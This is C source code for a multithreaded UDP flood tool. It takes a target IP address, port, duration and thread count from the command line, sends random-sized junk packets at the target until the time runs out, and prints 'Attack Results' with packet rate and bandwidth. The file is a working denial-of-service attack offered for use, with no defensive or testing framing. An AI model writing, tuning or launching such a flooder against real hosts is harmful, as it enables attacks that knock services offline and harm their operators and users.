#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/time.h>

#define MAX_PACKET_SIZE 1400
#define THREADS_PER_CORE 2  // Optimal for most systems

volatile sig_atomic_t stop = 0;

typedef struct {
    char target_ip[16];
    int target_port;
    int duration;
    int thread_id;
    unsigned long packets_sent;
    unsigned long bytes_sent;
} thread_data;

void generate_payload(char *payload, int size) {
    // Efficient payload generation
    for (int i = 0; i < size; i++) {
        payload[i] = (char)(rand() % 256);
    }
}

void *udp_flood(void *arg) {
    thread_data *data = (thread_data *)arg;
    struct sockaddr_in dest_addr;
    char payload[MAX_PACKET_SIZE];
    int sock;
    struct timeval start, end;
    
    // Setup destination
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(data->target_port);
    inet_pton(AF_INET, data->target_ip, &dest_addr.sin_addr);
    
    // Create optimized socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        return NULL;
    }
    
    // Socket optimizations
    int opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &(int){1024*1024}, sizeof(int));
    
    gettimeofday(&start, NULL);
    
    while (!stop) {
        gettimeofday(&end, NULL);
        if (end.tv_sec - start.tv_sec >= data->duration) break;
        
        // Generate random size packet (500-1400 bytes)
        int pkt_size = 500 + (rand() % (MAX_PACKET_SIZE-500));
        generate_payload(payload, pkt_size);
        
        // Send without checking response (flood mode)
        sendto(sock, payload, pkt_size, 0, 
              (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        
        data->packets_sent++;
        data->bytes_sent += pkt_size;
    }
    
    close(sock);
    return NULL;
}

void print_stats(thread_data *threads, int thread_count, int duration) {
    unsigned long total_packets = 0;
    unsigned long total_bytes = 0;
    
    printf("\n=== Attack Results ===\n");
    for (int i = 0; i < thread_count; i++) {
        total_packets += threads[i].packets_sent;
        total_bytes += threads[i].bytes_sent;
    }
    
    printf("Total Packets: %lu\n", total_packets);
    printf("Total Data: %.2f MB\n", (float)total_bytes/(1024*1024));
    printf("Average Rate: %.2f packets/sec\n", (float)total_packets/duration);
    printf("Bandwidth: %.2f Mbps\n\n", 
          ((float)total_bytes*8)/(duration*1024*1024));
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <TIME> <THREADS>\n", argv[0]);
        printf("Example: %s 1.2.3.4 80 60 8\n", argv[0]);
        return 1;
    }
    
    // Get system core count
    int cores = sysconf(_SC_NPROCESSORS_ONLN);
    int max_threads = cores * THREADS_PER_CORE;
    int req_threads = atoi(argv[4]);
    
    if (req_threads > max_threads) {
        printf("Warning: Reducing threads from %d to %d (optimal for %d cores)\n",
              req_threads, max_threads, cores);
        req_threads = max_threads;
    }
    
    // Initialize threads
    pthread_t *threads = malloc(req_threads * sizeof(pthread_t));
    thread_data *tdata = malloc(req_threads * sizeof(thread_data));
    
    printf("Starting UDP flood with %d threads for %s seconds...\n", 
          req_threads, argv[3]);
    
    // Create threads
    for (int i = 0; i < req_threads; i++) {
        strncpy(tdata[i].target_ip, argv[1], 16);
        tdata[i].target_port = atoi(argv[2]);
        tdata[i].duration = atoi(argv[3]);
        tdata[i].thread_id = i;
        tdata[i].packets_sent = 0;
        tdata[i].bytes_sent = 0;
        
        pthread_create(&threads[i], NULL, udp_flood, &tdata[i]);
    }
    
    // Wait for completion
    sleep(atoi(argv[3]));
    stop = 1;
    
    for (int i = 0; i < req_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    print_stats(tdata, req_threads, atoi(argv[3]));
    
    free(threads);
    free(tdata);
    return 0;
}
